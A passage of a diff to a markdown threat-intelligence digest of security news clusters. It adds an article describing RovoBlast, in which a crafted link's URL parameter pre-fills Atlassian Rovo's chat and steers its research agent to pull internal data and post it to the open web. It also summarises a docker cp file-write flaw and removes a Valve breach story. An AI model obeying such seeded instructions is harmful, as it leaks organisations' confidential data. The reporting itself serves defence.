as "almost non-existent," and said one click was usually enough to have the assistant retrieve and summarize sensitive material without any bypass technique. The Assistant's Own Research Tool as the Exit Turning that access into leakage required an outbound path, and Varonis found one already built in. Rovo's ResearchAgent performs multi-source open web research and can browse and navigate arbitrary websites across multiple steps autonomously. That combination supplied the whole chain in a single agent run: retrieve internal content, transform it, then post it somewhere externally reachable. Chaining the steps inside one agent also reduced the number of user-facing interactions, leaving an audit trail that resembled ordinary research activity. Compounding the exposure, Rovo cannot be fully removed from an Atlassian environment, so organizations cannot eliminate the attack surface by uninstalling it. Varonis recommended shrinking what the assistant can reach, disconnecting unused integrations and keeping legal, HR, finance and incident response content out of scope entirely. It also advised disabling browsing agents and multi-step automation where teams do not rely on them, reviewing assistant logs, alerting on unusual agent runs and periodically testing how an environment responds to seeded prompts. You may also like Prompt Injection Bugs Found in Official Anthropic Git MCP Server News 20 January 2026 Critical Vulnerability in Salesforce AgentForce Exposed News 25 September 2025 GrafanaGhost Exploit Bypasses AI Guardrails for Silent Data Exfiltration News 7 April 2026 AI Attacks Surge as Microsoft Process 100 Trillion Signals Daily News 16 October 2025 Microsoft 365 Copilot Vulnerability Exposes User Data Risks News 27 August 2024 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Go-Based macOS Malware Steals Crypto and Secrets News 10 August 2026 1 Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant News 10 August 2026 2 WordPress Plugins Compromised Without a Single File Change News 10 August 2026 3 US Sanctions Iranian $6bn Crypto “Ex
+Author here. We discovered a vulnerability in docker cp that allows a malicious container to create or overwrite files on the machine running the Docker CLI. The exploit combines a filesystem race in Docker’s archive creation with unsafe symlink handling during extraction. Depending on the CLI user’s privileges, this can lead to developer-account compromise or root code execution. Docker confirmed that sbx cp was also affected. Fixed versions: Docker Engine/CLI 29.7.2+ Docker Desktop 4.86.0+ Docker Sandboxes 0.38.0+ Happy to answer technical questions. submitted by /u/ronmasas [link] [comments]
 ```
 
 #### Corroborating sources (1)
 
-- **Infosecurity Magazine** (cyber_news_breach_reporting)
-  - Title: Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant
-  - Published: 2026-08-10T15:30:00+00:00
-  - Link: https://www.infosecurity-magazine.com/news/rovoblast-atlassian-rovo-url/
-  - Summary: Atlassian fixed a flaw letting one crafted link make its Rovo AI assistant exfiltrate company data
+- **Reddit r/netsec** (reddit_practitioner_osint)
+  - Title: CopyEscape: Container-to-host arbitrary file write via docker cp (CVE-2026-17106)
+  - Published: 2026-08-11T15:33:52+00:00
+  - Link: https://www.reddit.com/r/netsec/comments/1vlkth5/copyescape_containertohost_arbitrary_file_write/
+  - Summary: Author here. We discovered a vulnerability in docker cp that allows a malicious container to create or overwrite files on the machine running the Docker CLI. The exploit combines a filesystem race in Docker’s archive creation with unsafe symlink handling during extraction. Depending on the CLI user’s privileges, this can lead to developer-account compromise or root code execution. Docker confirmed that sbx cp was also affected. Fixed versions: Docker Engine/CLI 29.7.2+ Docker Desktop 4.86.0+ Docker Sandboxes 0.38.0+ Happy to answer technical questions. submitted by /u/ronmasas [link] [comments]
 
 ### Cluster 1e4f97d7fa — score 9
 
@@ -2992,51 +3194,6 @@ Public leaderboards can't tell you which LLM to trust in your SOC, so Elastic bu
   - Link: https://www.elastic.co/security-labs/llm-benchmarking-agentic-soc
   - Summary: Public leaderboards can't tell you which LLM to trust in your SOC, so Elastic built an evaluation framework that grades models on the work (tool calls, execution traces, blind judging) across Agent Builder, Attack Discovery, and automatic migration.
 
-### Cluster bc23ee8ea9 — score 8
-
-- Title: Valve notifies Steam hardware customers of a data breach
-- Source: BleepingComputer (cyber_news_breach_reporting)
-- Published: 2026-08-10T11:47:55+00:00
-- Link: https://www.bleepingcomputer.com/news/security/valve-notifies-steam-hardware-customers-of-a-data-breach/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: data_breach, phishing_social_eng
-- actor_attribution: ShinyHunters
-- affected_products: Snowflake
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: phishing_social_eng, data_breach
-- actor_attribution: ShinyHunters
-- affected_products: Snowflake
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Video game publisher and digital distribution giant Valve is notifying Steam hardware customers in Europe that hackers stole their data after hacking its shipping partner, CEVA Logistics. [...]
-```
-
-#### Full body
-
-```
-Valve notifies Steam hardware customers of a data breach By Sergiu Gatlan August 10, 2026 07:47 AM 0 Video game publisher and digital distribution giant Valve is notifying Steam hardware customers in Europe that hackers stole their data after hacking its shipping partner, CEVA Logistics. CEVA Logistics (a fully-owned subsidiary of the CMA CGM Group, the world's third-largest shipping company) operates 1,000 warehouses, handled 15 million shipments last year, and reported $18.3 billion in revenues in 2025. According to many reports on social media, affected Valve customers began receiving data breach notification emails earlier today . In these emails, Valve said the attackers had access to CEVA Logistics' servers between July 29 and August 1, which allowed them to gain access to information needed to ship hardware orders to Steam customers. "Between July 29 2026 and August 1, 2026, a cyberattack hit CEVA Logistics, the company that ships Steam hardware to customers in Europe. CEVA is still investigating this attack, but as Valve learned on August 7, certain information about Steam customers, including you, was likely compromised," Valve said. "CEVA receives specific delivery-related information from Steam to be able to ship physical hardware to customers in Europe, and told us these are the details the attacker likely took. Because CEVA retains this information for up to 90 days after that order, we are sending this message to all customers we can assume were impacted." The stolen data includes the affected individuals' names, addresses, phone numbers, email addresses, and the type and price of ordered products. However, Valve added that no additional information related to the Steam account or other purchases was impacted, as CEVA does not have access to payment information, passwords, Steam Guard codes, or other sensitive data. Valve data breach notification email ( fodilicious ) The company also warned affected Steam customers that they may be targeted by email, SMS, or voice phishing messages using the stolen information and impersonating Steam, Valve, or delivery companies. "They may quote your address back to you to prove they're genuine. They may ask you to confirm a delivery, pay a small customs or redelivery fee, or sign in somewhere to "verify" your order. Treat all of them as fake. You do not need to change your Steam password, and you don't need to do anything to your account settings," it added. "We're pressing CEVA for the full scope of what was taken and how, and we are in the process of notifying the data protection authorities in the countries affected, including yours. CEVA has isolated the affected systems, taken all offline and brought in outside investigators." Valve's disclosure comes after CEVA Logistics informed multiple European retailers on August 1 that a cyberattack disrupted operations at eight of its European warehouses. A Valve spokesperson was not immediately available for comment when contacted by BleepingComputer earlier today. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Canadian pleads guilty to Snowflake cloud data-theft attacks Lidl discloses online shop breach after service provider hack Insurance giant Aflac discloses data breach after subsidiary hack Council of Europe investigates ShinyHunters data breach claims Infinite Campus data breach affects 137,000 school staff accounts
-```
-
-#### Corroborating sources (1)
-
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: Valve notifies Steam hardware customers of a data breach
-  - Published: 2026-08-10T11:47:55+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/valve-notifies-steam-hardware-customers-of-a-data-breach/
-  - Summary: Video game publisher and digital distribution giant Valve is notifying Steam hardware customers in Europe that hackers stole their data after hacking its shipping partner, CEVA Logistics. [...]
-
 ### Cluster 772794dddb — score 8
 
 - Title: ⚡ Weekly Recap: AI Goes Rogue, Metabase 0-Day, MCP Supply-Chain Attacks, and Router Backdoors
@@ -3130,6 +3287,51 @@ AI-Assisted HTTP Terminator Finds Novel HTTP Desync Techniques and Apache Zero-D
   - Published: 2026-08-07T10:09:54+00:00
   - Link: https://thehackernews.com/2026/08/ai-assisted-http-terminator-finds-novel.html
   - Summary: PortSwigger says HTTP Terminator, an artificial intelligence (AI)-assisted research system built by James Kettle, generated and proved new HTTP desynchronization techniques after exploring 30,000 candidate desync vectors. PortSwigger said a separate human-guided discovery cascade also exposed a zero-day in Apache Traffic Server. Kettle said HTTP Terminator tested 30,000 websites where
+
+### Cluster 3b8dca7ee7 — score 8
+
+- Title: Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant
+- Source: Infosecurity Magazine (cyber_news_breach_reporting)
+- Published: 2026-08-10T15:30:00+00:00
+- Link: https://www.infosecurity-magazine.com/news/rovoblast-atlassian-rovo-url/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: ai_security
+- affected_industries: financial_services, legal_professional
+- affected_products: Apple iOS/macOS, Microsoft 365, Salesforce
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ai_security
+- affected_industries: financial_services, legal_professional
+- affected_products: Salesforce, Apple iOS/macOS, Microsoft 365
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Atlassian fixed a flaw letting one crafted link make its Rovo AI assistant exfiltrate company data
+```
+
+#### Full body
+
+```
+Infosecurity Magazine Home » News » Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant News 10 August 2026 Written by Alessandro Mascellino News Reporter Email Alessandro Follow @a_mascellino A flaw in Atlassian's enterprise AI assistant has allowed a single crafted link to seed attacker instructions into a victim's authenticated session, then use the assistant's own browsing agent to push company data out to the public web. Varonis Threat Labs disclosed the flaw, which it named RovoBlast, to Atlassian and published its analysis on August 7 after presenting the research at DEF CON 34. Atlassian has since fixed it. Rovo functions as an AI layer across Jira, Confluence and Bitbucket, alongside connected services including Slack, Microsoft 365 and Google Workspace. Asked to enumerate what it could read, it listed all of those plus relational databases, uploaded files, web pages and archives. Atlassian's connector catalogue supports more than 50 platforms. Read more on AI assistant data leakage: New Zero-Click AI Vulnerability Allows Corporate Data Theft A Prompt Delivered in the URL Rovo accepted a URL parameter that pre-filled its chat entry, surfacing whatever the link contained directly into the session. Varonis called the pattern Parameter-to-Prompt, and identified the same primitive in Microsoft Copilot in January under the name Reprompt. Because the victim's session was already held in the browser, a click was all that was required. No warning appeared, no confirmation was requested, and nothing marked the session as having been seeded from an external parameter. The organization identifier in the path could also be left empty, with Atlassian redirecting the request into the user's default organization. Varonis described Rovo's guardrails around untrusted prompts as "almost non-existent," and said one click was usually enough to have the assistant retrieve and summarize sensitive material without any bypass technique. The Assistant's Own Research Tool as the Exit Turning that access into leakage required an outbound path, and Varonis found one already built in. Rovo's ResearchAgent performs multi-source open web research and can browse and navigate arbitrary websites across multiple steps autonomously. That combination supplied the whole chain in a single agent run: retrieve internal content, transform it, then post it somewhere externally reachable. Chaining the steps inside one agent also reduced the number of user-facing interactions, leaving an audit trail that resembled ordinary research activity. Compounding the exposure, Rovo cannot be fully removed from an Atlassian environment, so organizations cannot eliminate the attack surface by uninstalling it. Varonis recommended shrinking what the assistant can reach, disconnecting unused integrations and keeping legal, HR, finance and incident response content out of scope entirely. It also advised disabling browsing agents and multi-step automation where teams do not rely on them, reviewing assistant logs, alerting on unusual agent runs and periodically testing how an environment responds to seeded prompts. You may also like Prompt Injection Bugs Found in Official Anthropic Git MCP Server News 20 January 2026 Critical Vulnerability in Salesforce AgentForce Exposed News 25 September 2025 GrafanaGhost Exploit Bypasses AI Guardrails for Silent Data Exfiltration News 7 April 2026 AI Attacks Surge as Microsoft Process 100 Trillion Signals Daily News 16 October 2025 Microsoft 365 Copilot Vulnerability Exposes User Data Risks News 27 August 2024 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Go-Based macOS Malware Steals Crypto and Secrets News 10 August 2026 1 Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant News 10 August 2026 2 WordPress Plugins Compromised Without a Single File Change News 10 August 2026 3 US Sanctions Iranian $6bn Crypto “Ex
+```
+
+#### Corroborating sources (1)
+
+- **Infosecurity Magazine** (cyber_news_breach_reporting)
+  - Title: Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant
+  - Published: 2026-08-10T15:30:00+00:00
+  - Link: https://www.infosecurity-magazine.com/news/rovoblast-atlassian-rovo-url/
+  - Summary: Atlassian fixed a flaw letting one crafted link make its Rovo AI assistant exfiltrate company data
 
 ### Cluster 38f40f9f14 — score 8
 
